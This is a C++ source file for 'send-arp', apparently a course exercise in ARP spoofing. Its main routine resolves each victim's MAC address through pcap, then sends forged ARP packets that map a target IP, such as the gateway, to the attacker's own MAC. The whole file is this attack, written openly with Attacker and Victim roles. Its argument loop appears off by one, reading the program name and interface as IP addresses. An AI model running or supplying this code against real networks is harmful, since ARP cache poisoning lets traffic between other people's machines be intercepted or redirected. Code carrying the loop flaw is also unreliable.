#include "send-arp.h"

void usage()
{
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc % 2 != 0)
	{
		usage();
		return (-1);
	}

	t_info	Attacker;
	char	*ifc = argv[1];

	if (!_get_my_mac(&Attacker, ifc))
	{
		printf("[Error] Couldn't get my mac and ip address\n");
		return (-1);
	}

	for (int i = 0; i < argc / 2; i++)
	{
		char* dev = argv[1];
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
		t_info Victim;
		t_info Target;
		if (handle == nullptr)
		{
			fprintf(stderr, "[Error] couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}
		
		Victim.ip = Ip(argv[2 * i]);
		Target.ip = Ip(argv[2 * i + 1]);
		_get_victim_mac(handle, &Victim, &Attacker);
		Target.mac = Attacker.mac;

		_send_arp_packet(handle, 1, Victim, Attacker, Victim, Target);
		pcap_close(handle);
		
	}
	
	return (0);
}
